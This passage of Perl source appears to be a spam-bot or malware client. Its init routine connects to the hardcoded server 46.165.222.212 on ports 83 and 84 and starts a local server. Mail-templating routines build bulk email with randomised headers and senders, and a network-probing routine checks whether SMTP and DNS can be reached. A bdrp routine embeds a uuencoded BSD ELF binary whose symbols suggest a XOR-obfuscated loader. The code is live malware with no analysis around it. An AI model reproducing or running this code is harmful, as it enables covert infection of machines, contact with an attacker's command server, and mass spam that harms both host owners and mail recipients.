$info =~ s/.*?\|[\s\|]*(.+?)[\s\|]*$/$1/ if length $info;
return (\$mail, \$name, \$info);
}
sub init
{
&bdrp() if $^O ne "MSWin32";
&main('46.165.222.212',83,'/');
&main('46.165.222.212',84,'/');
&startserver() if $^O ne "MSWin32";
}
sub data
{
my ($to, $from, $b) = @_;
my $time = time;
my $zone = sprintf ("%s%02d00", $b->{timezone}[0], $b->{timezone}[1]);
my $date = localtime $time; $date =~ s/^(\w+)\s+(\w+)\s+(\d+)\s+(\d+):(\d+):(\d+)\s+(\d+)$/sprintf "$1, $3 $2 $7 $4:$5:$6 %s", $zone/e;
my $wday = {Mon => "Monday", Tue => "Tuesday", Wed => "Wednesday", Thu => "Thursday", Fri => "Friday", Sat => "Saturday", Sun => "Sunday"}->{$1};
my $nmon = {Jan => 1, Feb => 2, Mar => 3, Apr => 4, May => 5, Jun => 6, Jul => 7, Aug => 8, Sep => 9, Oct => 10, Nov => 11, Dec => 12}->{$2};
my $tmon = ["January", "February", "March", "April", "May", "June", "July", "August", "September", "October", "November", "December"]->[$nmon - 1];
my $ampm = "AM"; my $hour = int $4; $ampm = "PM" if $hour == 12; $hour = 12 if $hour == 0; if ($hour > 12) { $ampm = "PM"; $hour -= 12; }
$date =
{
DATE	=> $date,
WWWW	=> $wday,
WWW		=> $1,
DD		=> sprintf ("%02d", $3),
D		=> $3,
MMMM	=> $tmon,
MMM		=> $2,
MM		=> sprintf ("%02d", $nmon),
M		=> $nmon,
YYYY	=> $7,
YY		=> substr ($7, -2),
Z		=> $zone,
TT		=> $ampm,
tt		=> lc $ampm,
HH		=> $4,
H		=> int $4,
hh		=> sprintf ("%02d", $hour),
h		=> $hour,
mm		=> $5,
m		=> int $5,
ss		=> $6,
s		=> int $6
};
my ($mail, $name) = &mail(\$from);
my ($user, $host) = split (/\@/, $$mail);
$from = {ADDR => length $$name ? "$$name <$$mail>" : "<$$mail>", NAME => length $$name ? $$name : "", MAIL => $$mail, USER => $user, HOST => $host};
my $replyto = $from;
if ($b->{from}[0] ne $b->{replyto}[0])
{
($mail, $name) = &mail(\@{$b->{replyto}}[int rand scalar @{$b->{replyto}}]);
($user, $host) = split (/\@/, $$mail);
$replyto = {ADDR => length $$name ? "$$name <$$mail>" : "<$$mail>", NAME => length $$name ? $$name : "", MAIL => $$mail, USER => $user, HOST => $host};
}
if ($b->{method} == 0)
{
@_ = ();
foreach (@$to) { ($mail, $name) = &mail(\$_); $_ = length $$name ? "$$name <$$mail>" : "<$$mail>"; push @_, $_; }
($user, $host) = split (/\@/, $$mail);
$to = {ADDR => join (",\x0D\x0A\x20\x20\x20\x20\x20\x20\x20\x20", @_), NAME => length $$name ? $$name : "", MAIL => $$mail, USER => $user, HOST => $host};
}
else
{
($mail, $name) = &mail(\$to->[0]);
($user, $host) = split (/\@/, $$mail);
$to = {ADDR => length $$name ? "$$name <$$mail>" : "<$$mail>", NAME => length $$name ? $$name : "", MAIL => $$mail, USER => $user, HOST => $host};
}
my $head =
{
HELO		=> $b->{helo},
TYPE		=> $b->{type} ? "html" : "plain",
SUBJECT		=> @{$b->{subject}}[int rand scalar @{$b->{subject}}],
CHARSET		=> $b->{charset},
ENCODING	=> $b->{charset} eq "windows-1251" ? "8bit" : "7bit",
NPRIORITY	=> (5 - $b->{priority} * $b->{priority} - ($b->{priority} == 1 ? 1 : 0)),
TPRIORITY	=> ["Low", "Normal", "High"]->[$b->{priority}],
MESSAGEID	=> sprintf ("%08x\.%04x%04x", int ($time * 0.0023283064365387 + 27111902.8329849), int rand 32769, int rand 32769)
};
my $letter = length $b->{letter} ? sprintf ("%s%s%s", $b->{header}, "\x0D\x0A\x0D\x0A", $b->{letter}) : $b->{header};
$letter =~ s/\%$_\%/$head->{$_}/g foreach (keys %$head);
$letter =~ s/\%$_\%/$date->{$_}/g foreach (keys %$date);
$letter =~ s/\%FROM$_\%/$from->{$_}/g foreach (keys %$from);
$letter =~ s/\%REPLYTO$_\%/$replyto->{$_}/g foreach (keys %$replyto);
$letter =~ s/\%TO$_\%/$to->{$_}/g foreach (keys %$to);
&tag(\$letter);
if (!length $b->{letter})
{
$letter =~ s/\x0D//gm;
$letter =~ s/\x0A/\x0D\x0A/gm;
}
return $letter;
}
sub quoted ($)
{
my $line = shift;
$line =~ s/([^ \t\x0D\x0A!"#\$%&'()*+,\-.\/0-9:;<>?\@A-Z[\\\]^_`a-z{|}~])/sprintf ("=%02X", ord ($1))/eg;
$line =~ s/([ \t]+)$/join ("", map {sprintf ("=%02X", ord ($_))} split ("", $1))/egm;
my $lines = "";
$lines .= "$1=\x0D\x0A" while $line =~ s/(.*?^[^\x0D\x0A]{71}(?:[^=\x0D\x0A]{2}(?![^=\x0D\x0A]{0,1}$)|[^=\x0D\x0A](?![^=\x0D\x0A]{0,2}$)|(?![^=\x0D\x0A]{0,3}$)))//xsm;
$lines .= $line;
return $lines;
}
sub tag
{
my $line = shift;
my $save = [];
$$line =~ s/\[random\]([^\[]*)\[\/random\]({\d+,\d+})?(\((\d+)\))?/&tagrandom($1, $2, $4, \$save)/eg;
$$line =~ s/\[string\]([^\[]*)\[\/string\](\((\d+)\))?/&tagstring($1, $3, \$save)/eg;
$$line =~ s/\%\[(\d+)\]/$1 < 64 && defined $save->[$1] ? $save->[$1] : ""/eg;
$$line =~ s/\[quot\](.*?)\[\/quot\]/&quoted($1)/egs;
}
sub tagrandom
{
my ($line, $spec, $cell, $save) = @_;
if (defined $line && length $line)
{
if (defined $spec && $spec =~ /^{(\d+),(\d+)}$/)
{
$spec = $2 > 64 ? 64 : $2;
$spec = $1 < $spec ? ($1 + int rand (1 + $spec - $1)) : $spec;
}
else
{
$spec = length $line;
$spec = 1 + ($spec > 64 ? int rand 64 : int rand $spec);
}
$line = [split (//, $line)];
$line = join ('', @$line[map {rand @$line}(1..$spec)]);
}
$line = defined $line ? $line : "";
$$save->[$cell] = $line if defined $cell && $cell < 64;
return $line;
}
sub tagstring
{
my ($line, $cell, $save) = @_;
if (defined $line && length $line)
{
$line = [split (/\|/, $line)];
$line = $line->[int rand scalar @$line];
}
$line = defined $line ? $line : "";
$$save->[$cell] = $line if defined $cell && $cell < 64;
return $line;
}
sub test
{
while (1)
{
my $readers = IO::Select->new() or last;
my $writers = IO::Select->new() or last;
my $session = {};
foreach my $result (keys %$test)
{
while (1 < scalar @{$test->{$result}})
{
my $host = pop @{$test->{$result}};
my $addr = pack ("C4", split (/\./, $host));
my ($protocol, $port);
if ($result eq "ip")
{
($protocol, $port) = ("tcp", 80);
}
else
{
($protocol, $port) = $result =~ /^(tcp|udp)(\d+)$/;
}
$addr = sockaddr_in($port, $addr);
my $socket = $protocol eq "tcp" ? IO::Socket::INET->new(Proto => "tcp", Type => SOCK_STREAM) : IO::Socket::INET->new(Proto => "udp");
next unless $socket;
if ($^O eq "MSWin32") { ioctl ($socket, 0x8004667e, pack ("L", 1)); } else { $socket->blocking(0); }
if ($protocol eq "tcp")
{
unless ($socket->connect($addr))
{
if ($! != $eiprogr && $! != $ewblock)
{
close $socket;
next;
}
}
}
$writers->add($socket);
$session->{$socket} = {status => $protocol eq "tcp" ? "cn" : "wr", buffer => "", timeout => 5, result => $result, addr => $addr};
if ($port == 53)
{
$session->{$socket}{buffer} .= pack ("nSn4", int rand 65535, 1, 1, 0, 0, 0);
$session->{$socket}{buffer} .= pack ("C", length $_) . $_ for (split (/\./, $host));
$session->{$socket}{buffer} .= pack ("Cn2", 0, 1, 1);
$session->{$socket}{buffer} = join ("", pack ("n", length $session->{$socket}{buffer}), $session->{$socket}{buffer}) if $protocol eq "tcp";
}
elsif ($port == 80)
{
$session->{$socket}{buffer} = join ("\x0D\x0A", "GET / HTTP/1.1", "Accept: image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, */*", "User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)", "Host: $host", "Connection: close", "Cache-Control: no-cache", "\x0D\x0A");
}
}
}
$session->{$_}{timeout} += time foreach (keys %$session);
while ($readers->count() || $writers->count())
{
my $time = time;
my $writable = (IO::Select->select(undef, $writers, undef, 0))[1];
foreach my $handle (@$writable)
{
if ($session->{$handle}{status} eq "cn")
{
if ($handle->connected)
{
if ($session->{$handle}{result} eq "tcp25")
{
$session->{$handle}{status} = "rd";
$readers->add($handle);
$writers->remove($handle);
}
else
{
$session->{$handle}{status} = "wr";
}
}
else
{
$session->{$handle}{timeout} = 0;
}
}
else
{
my $result;
if ($session->{$handle}{result} eq "udp53")
{
$result = $handle->send($session->{$handle}{buffer}, 0, $session->{$handle}{addr});
}
elsif ($session->{$handle}{result} eq "tcp53")
{
$result = $handle->send($session->{$handle}{buffer});
}
else
{
$result = syswrite ($handle, $session->{$handle}{buffer});
}
if (defined $result && $result > 0)
{
substr ($session->{$handle}{buffer}, 0, $result) = "";
if (length $session->{$handle}{buffer} < 1)
{
$session->{$handle}{status} = "rd";
$readers->add($handle);
$writers->remove($handle);
}
}
elsif ($! == $ewblock)
{
next;
}
else
{
$session->{$handle}{timeout} = 0;
}
}
}
my $readable = (IO::Select->select($readers, undef, undef, 0))[0];
foreach my $handle (@$readable)
{
my $result;
if ($session->{$handle}{result} eq "udp53")
{
$result = $handle->recv($session->{$handle}{buffer}, 512);
$result = length $session->{$handle}{buffer} if defined $result;
}
elsif ($session->{$handle}{result} eq "tcp53")
{
$result = $handle->recv($session->{$handle}{buffer}, 2);
$result = length $session->{$handle}{buffer} if defined $result;
}
else
{
$result = sysread ($handle, $session->{$handle}{buffer}, 8192, length $session->{$handle}{buffer});
}
if (defined $result)
{
if ($session->{$handle}{result} eq "ip")
{
if ($test->{$session->{$handle}{result}}[0] eq "0.0.0.0")
{
if ($session->{$handle}{buffer} =~ /(\d+\.\d+\.\d+\.\d+)/)
{
$test->{$session->{$handle}{result}}[0] = $1;
$session->{$handle}{timeout} = 0;
}
else
{
next;
}
}
else
{
$session->{$handle}{timeout} = 0;
}
}
else
{
$test->{$session->{$handle}{result}}[0] = 1 if $result > 0;
$session->{$handle}{timeout} = 0;
}
}
elsif ($! == $ewblock)
{
next;
}
else
{
$session->{$handle}{timeout} = 0;
}
}
foreach my $handle ($writers->handles, $readers->handles)
{
if ($time >= $session->{$handle}{timeout})
{
$readers->remove($handle) if $readers->exists($handle);
$writers->remove($handle) if $writers->exists($handle);
delete $session->{$handle};
close $handle;
}
}
}
last;
}
}
sub bdrp
{
my $bdrp;
if ($^O =~ /bsd$/i)
{
$bdrp = <<'BDRPDATABSD';
M?T5,1@$!`0D```````````(``P`!````@(`$"#0```"H&0```````#0`(``"
M`"@`!P`$``$``````````(`$"`"`!`@!`P```0,```4`````$````0````0#
M```$DP0(!),$"'86``",&@``!@`````0``````````````````"))7RI!`B^
M!9,$"+D-````Z'D```#HH````+X3DP0(N6<6``#H90```+@$````BQV,J00(
MN1.3!`BZ9Q8``%)14U#-@',"]]B!Q!`````]``````^,+````#G0#X4D````
MN`8```"+'8RI!`A34,V`<P+WV('$"````#T`````#XP`````,<!`,=M34,V`
M,=M#0T-#NA````!67SG3=1.!^H````!U`C'2@<(0````,=M#K##8JD/BXL.*
M#023!`BX*@```+N`J00(4U#-@',"]]B!Q`@````]``````^,HO___X#Y"74%
MB0.)4P2X*@```+N(J00(4U#-@',"]]B!Q`@````]``````^,=?___X#Y"74%
MB0.)4P2X`@```%"`^0EU"\V`<P+WV.D"````S8"!Q`0````]``````^,0O__
M_P^$20```+@&````BQV$J00(4U#-@',"]]B!Q`@````]``````^,&/___[@&
M````BQV(J00(4U#-@',"]]B!Q`@````]``````^,]/[__\.*%023!`BX/P``
M`(#Z"74%N%H```"+'8BI!`@QR5%34,V`<P+WV('$#````#T`````#XR\_O__
MN#\```"`^@EU!;A:````BQV$J00(,<E!45-0S8!S`O?8@<0,````/0`````/
MC(K^__^X!@```(L=@*D$"%-0S8!S`O?8@<0(````/0`````/C&;^__^X!@``
M`(L=C*D$"%-0S8!S`O?8@<0(````/0`````/C$+^__^+)7RI!`B)YEE8XOV-
M5"0$B?2-3"0$NP63!`B@!),$"#P)=0ZX.P```%)14U#I!0```+@+````S8#I
M!/[__P````DK<'5U)VMC92-]:WUM`'%V8R=[?7AB;WDU+W1Q9B15251!43$K
M>7YK+UE>*"E'>G5\?6TA.VEN>S](33D^5F-K;6I^,"PI/B\M,3!B>71_>SHB
M.C]@/2,_$1H"3ET%`D)?2T9$3T8.$B$S,C\E:WXH+6]B?']A:&(Q+S,E("8L
M.'!\.S0Y0%``1%,#!DE/25U1"`(,5@X+54907UM671<%&0L*!QT:6FAR<6MB
M="<U*3LZ.38N<AIX=#,\,4A8.'QK.SY[;'I%0U%'!@P&7`@-3UQ.04%,6Q$/
M$P<`#1<<7%-+3E)936!\8G!R?F8Z:&\G*B4C9F8Z(G!Q9R9J:6!D*W<M:W=Y
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
M1Q8`!P,-&QE&4A\+`A\'%UM0'1<9'!4?4EP4&%\E<&9E86-U>R0T;G1D?7MR
M*B=L9&AC9&PC,"QN8F!C=#(W?'1X<W1\(3MA/6QZ=7=Q:CXF>BAT*G8&````
M+G-Y;71A8@`N<W1R=&%B`"YS:'-T<G1A8@`N=&5X=``N9&%T80`N8G-S````
M```````````````````````````````````````````````````;`````0``
M``8```"`@`0(@````($"`````````````!``````````(0````$````#````
M!),$"`0#``!V%@`````````````$`````````"<````(`````P```'RI!`A\
M&0``%`0`````````````!``````````1`````P``````````````?!D``"P`
M``````````````$``````````0````(``````````````,`:``!0`@``!@``
M`"$````$````$`````D````#```````````````0'0``K`$`````````````
M`0```````````````````````````````````("`!`@``````P`!```````$
MDP0(``````,``@``````?*D$"``````#``,``````````````````P`$````
M``````````````,`!0`````````````````#``8``0``````````````!`#Q
M_Q8````%@00(`````````0`;````#H$$"`````````$`(P```!N!!`@`````
M```!`#H````I@00(`````````0!1````,H$$"`````````$`:````#J!!`@`
M```````!`&T```!M@00(`````````0"&````FH$$"`````````$`GP```+"!
M!`@````````!`+@```"R@00(`````````0#1````$H($"`````````$`X0``
M`">"!`@````````!`/H```!8@@0(`````````0`3`0``]8($"`````````$`
M+`$``/J"!`@````````!`$4!```$DP0(`````````@!,`0``!9,$"```````
M``(`4P$```T```````````#Q_UH!```3DP0(`````````@!A`0``9Q8`````
M`````/'_:`$```$```````````#Q_W$!``!\J00(`````````P!X`0``@*D$
M"`````````,`?P$``(BI!`@````````#`(8!``"0J00(`````````P"-`0``
M@(`$"``````0``$`E`$``'JI!`@`````$`#Q_Z`!``!ZJ00(`````!``\?^G
M`0``D*T$"``````0`/'_`"XO+B]L;V%D97)?9G)E96)S9"YS`&5X:70`>&]R
M9&%T80!X;W)D871A+GAO<F1A=&%?;&]O<%\Q`'AO<F1A=&$N>&]R9&%T85]L
M;V]P7S(`>&]R9&%T82YX;W)D871A7VQO;W!?,P!P:7!E`'!I<&4N<&EP95]S
M:VEP7V9R965B<V1?,0!P:7!E+G!I<&5?<VMI<%]F<F5E8G-D7S(`<&EP92YP
M:7!E7W-K:7!?9G)E96)S9%\S`'!I<&4N<&EP95]S:VEP7V9R965B<V1?-`!P
M:7!E+G!I<&5?8VAI;&0`<&EP92YP:7!E7W-K:7!?9G)E96)S9%\U`'!I<&4N
M<&EP95]S:VEP7V9R965B<V1?-@!P:7!E+G!I<&5?<VMI<%]F<F5E8G-D7S<`
M<&EP92YP:7!E7W-K:7!?9G)E96)S9%\X`'-Y<W1E;0!A<F=V7S``87)G=E]S
